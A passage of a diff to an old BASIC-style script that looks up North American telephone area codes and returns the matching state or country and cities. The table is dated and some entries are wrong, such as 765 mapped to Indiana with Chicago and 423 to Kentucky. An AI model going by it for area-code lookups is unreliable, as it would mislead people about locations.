+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "253"
+ ASD1$ = "Washington        "
+ ASD2$ = "Auburn, Kent, Tacoma"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "254"
+ ASD1$ = "Texas             "
+ ASD2$ = "Waco"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "264"
+ ASD1$ = "Anguilla          "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "268"
+ ASD1$ = "Antigua & Barbuda "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "281"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Deer Park"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "301"
+ ASD1$ = "Maryland (MD)*OLD*"
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "302"
+ ASD1$ = "Delaware (DE)     "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "303"
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Denver, Grand Junction, Sterling"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "304"
+ ASD1$ = "West Virginia (WV)"
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "305"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Ft. Lauderdale, Key West, Miami"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "306"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Saskatchewan (SK)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "307"
+ ASD1$ = "Wyoming (WY)      "
+ ASD2$ = " (All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "308"
+ ASD1$ = "Nebraska (NE)     "
+ ASD2$ = "North Platte"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "309"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Peoria"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "310"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Long Beach, Redondo Beach, San Pedro, Santa Monica, Century City, Malibu"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "312"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Aurora, Chicago, Waukegan"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "313"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Ann Arbor,Detroit,Monroe,Chelsea,Dearborn,Plymouth,Livonia,Lincoln Park,Romulus,Taylor,Westland"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "314"
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Poplar Bluff, Rolla, St. Louis"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "315"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Syracuse"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "316"
+ ASD1$ = "Kansas (KS)       "
+ ASD2$ = "Dodge City, Wichita"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "317"
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Indianapolis, Kokomo"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "318"
+ ASD1$ = "Louisiana (LA)    "
+ ASD2$ = "Lake Charles, Shreveport"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "319"
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Dubuque"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "320"
+ ASD1$ = "Minnesota         "
+ ASD2$ = "Alexandria, St Cloud"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "330"
+ ASD1$ = "Ohio              "
+ ASD2$ = "Akron, Canton, Warren, Youngstown"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "334"
+ ASD1$ = "Alabama (AL)      "
+ ASD2$ = "Montgomery, Mobile"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "340"
+ ASD1$ = "US Virgin Islands "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "345"
+ ASD1$ = "Cayman Islands    "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "352"
+ ASD1$ = "Florida           "
+ ASD2$ = "Gainesville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "360"
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = "Bellingham, Longview, Marysville, Olympia, Port Orchard, Vancouver, Yelm"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "401"
+ ASD1$ = "Rhode Island (RI) "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "402"
+ ASD1$ = "-Nebraska (NE)    "
+ ASD2$ = "Lincoln, Omaha"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "403"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Alberta (AB), Calgary"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "404"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Atlanta, Rome, Marietta, Kennesaw, Norcross, Woodstock, Gainesville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "405"
+ ASD1$ = "Oklahoma (OK)     "
+ ASD2$ = "Norman, Oklahoma City, Stillwater"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "406"
+ ASD1$ = "Montana (MT)      "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "407"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Deltona,Kissimmee,Longwood,Melbourne,Orlando,Palm Beach,Titusville,Winter Park"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "408"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Jose"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "409"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Bryan, College Station, Galveston, Beaumont, Vidor, Richwood"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "410"
+ ASD1$ = "Maryland (MD)     "
+ ASD2$ = "Annapolis, Baltimore, Cambridge, Cockeysville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "412"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Pittsburgh"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "413"
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Springfield"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "414"
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Green Bay, Milwaukee, Racine"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "415"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Francisco, San Rafael, San Bruno, Los Altos"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "416"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Toronto, Hamilton"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "417"
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Joplin, Springfield"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "418"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "419"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Bowling Green, Findlay, Lima, Toledo"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "423"
+ ASD1$ = "Kentucky          "
+ ASD2$ = "Jellico, Kensee, Lot, Oneida, Saxton"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "425"
+ ASD1$ = "Washington        "
+ ASD2$ = "Bellevue, Edmonds, Everett"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "440"
+ ASD1$ = "Ohio              "
+ ASD2$ = "Cleveland, Mentor, Oberlin, Westlake"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "441"
+ ASD1$ = "Bermuda           "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "443"
+ ASD1$ = "Maryland          "
+ ASD2$ = "Annapolis, Baltimore, Rockville, Salisbury"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "473"
+ ASD1$ = "Grenada           "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "501"
+ ASD1$ = "Arkansas (AR)     "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "502"
+ ASD1$ = "Kentucky (KY)     "
+ ASD2$ = "Frankfort, Louisville, Paducah, Shelbyville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "503"
+ ASD1$ = "Oregon (OR)       "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "504"
+ ASD1$ = "Louisiana (LA)    "
+ ASD2$ = "Baton Rouge, New Orleans"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "505"
+ ASD1$ = "New Mexico (NM)   "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "506"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "New Brunswick (NB)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "507"
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Rochester"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "508"
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Northborough"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "509"
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = "Spokane, Walla Walla"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "510"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Berkeley, Fremont, Oakland, Walnut Creek"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "512"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Alice,Del Rio,Corpus Christi,Austin,Brownsville,Rockport,San Antonio"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "513"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Cincinnati, Dayton"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "514"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ), Montreal"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "515"
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Des Moines"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "516"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Amityville, Farmingdale, Hempstead, Levittown"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "517"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Lansing, Saginaw, Alpena, Jackson"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "518"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Albany, Schenectady"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "519"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), London"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "520"
+ ASD1$ = "Arizona (AZ)      "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "540"
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Fredericksburg, Roanoke, Spotsylvania, Stephens City, Troutville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "541"
+ ASD1$ = "Oregon            "
+ ASD2$ = "Ashland, Bend, Corvallis, Eugene, Pendleton"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "562"
+ ASD1$ = "California (CA)   "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "573"
+ ASD1$ = "Missouri          "
+ ASD2$ = "Columbia, Hannibal, Jefferson City"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "601"
+ ASD1$ = "Mississippi (MS)  "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "602"
+ ASD1$ = "Arizona (AZ)      "
+ ASD2$ = " "
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "603"
+ ASD1$ = "New Hampshire (NH)"
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "604"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "British Columbia (BC)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "605"
+ ASD1$ = "South Dakota (SD) "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "606"
+ ASD1$ = "Kentucky (KY)     "
+ ASD2$ = "Covington, Winchester"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "607"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Binghamton"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "608"
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Madison"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "609"
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Atlantic City, Camden, Trenton"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "610"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Allentown, Boyertown, Downingtown, Fleetwood, Sadsburyville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "612"
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Minneapolis, St Paul"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "613"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Ottawa"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "614"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Columbus"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "615"
+ ASD1$ = "Tennessee (TN)    "
+ ASD2$ = "Chattanooga, Nashville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "616"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Battle Creek, Grand Rapids, Kalamazoo"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "617"
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Boston, New Bedford, Plymouth, Worcester"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "618"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Alton, Centralia, Mt. Vernon"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "619"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Barstow, Carlsbad, San Diego, Santee"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "626"
+ ASD1$ = "California        "
+ ASD2$ = "Burbank, Glendale, Pasadena"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "630"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "649"
+ ASD1$ = "TurksCaicosIslands"
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "650"
+ ASD1$ = "California        "
+ ASD2$ = "Los Altos, Palo Alto,South San Francisco"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "664"
+ ASD1$ = "Montserrat        "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "670"
+ ASD1$ = "North Mariana Isl."
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "671"
+ ASD1$ = "Guam              "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "700"
+ ASD1$ = "Lifetime phone    "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "701"
+ ASD1$ = "North Dakota (ND) "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "702"
+ ASD1$ = "Nevada (NV)       "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "703"
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Arlington, Roanoke, Winchester"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "704"
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Charlotte, Salisbury"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "705"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), North Bay"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "706"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Augusta, Martinez, Columbus"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "707"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Santa Rosa"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "708"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Northbrook, Antioch, Evanston, Elgin, Harvey, Peotone"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "709"
+ ASD1$ = "Canada (CN)!      "
+ ASD2$ = "Newfoundland (NF), Labrador"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "712"
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Council Bluffs"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "713"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Pasadena, Houston, Rosenberg"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "714"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Orange County"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "715"
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Eau Claire, Wausau"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "716"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Buffalo, Niagara Falls, Rochester"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "717"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Harrisburg, Scranton"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "718"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Brooklyn, Queens, Staten Island"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "719"
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Colorado Springs, Pueblo, Canon City"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "732"
+ ASD1$ = "New Jersey        "
+ ASD2$ = "Long Branch, New Brunswick"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "757"
+ ASD1$ = "Virginia          "
+ ASD2$ = "Norfolk, Newport News, Williamsburg"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "758"
+ ASD1$ = "St Lucia          "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "760"
+ ASD1$ = "California        "
+ ASD2$ = "Barstow, Palm Springs"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "765"
+ ASD1$ = "Indiana           "
+ ASD2$ = "Chicago"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "770"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Atlanta, Conyers, Decatur, Marietta, Riverdale"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "773"
+ ASD1$ = "Illinois          "
+ ASD2$ = "Chicago"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "787"
+ ASD1$ = "Puerto Rico       "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "800"
+ ASD1$ = "Toll Free In U.S. "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "801"
+ ASD1$ = "Utah (UT)         "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "802"
+ ASD1$ = "Vermont (VT)      "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "803"
+ ASD1$ = "South Carolina    "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "804"
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Charlottesville, Newport News, Norfolk, Richmond"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "805"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Bakersfield"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "806"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Amarillo, Borger, Dalhart, Lubbock"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "807"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Thunder Bay"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "808"
+ ASD1$ = "Hawaii (HI)       "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "809"
+ ASD1$ = "Various Location  "
+ ASD2$ = "Anguilla,Antigua,Bahamas,Barbados,Bequia,Bermuda,Cayman Islands,Dominican Rep,Jamaica,Montserrat,Palm Island,Puerto Rico (PR),St Lucia,St Vincent,Trinidad,Tobago,Union Island,Virgin Islands (VI)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "810"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Brighton,Flint,Pontiac,Mt. Clemens,Snover,Warren,Troy,Madison Heights,Port Huron,Royal Oak,Oak Park,Southfield"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "812"
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Evansville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "813"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Ft. Myers, Winter Haven"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "814"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Altoona, Erie"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "815"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Rockford, Woodstock, Joliet"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "816"
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Belton, Independence, Kansas City, Marshall, St Joseph, Sedalia"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "817"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Denton, Fort Worth, Temple, Waco"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "818"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Fernando Valley Area"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "819"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "830"
+ ASD1$ = "Texas             "
+ ASD2$ = "Fredericksburg, Kerrville, San Antonio"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "847"
+ ASD1$ = "Illinois          "
+ ASD2$ = "Chicago, Evanston, Waukegan"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "850"
+ ASD1$ = "Florida           "
+ ASD2$ = "Panama City, Pensacola, Tallahassee"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "860"
+ ASD1$ = "Connecticut       "
+ ASD2$ = "Hartford"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "864"
+ ASD1$ = "South Carolina    "
+ ASD2$ = "Anderson, Greenville, Spartanburg"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
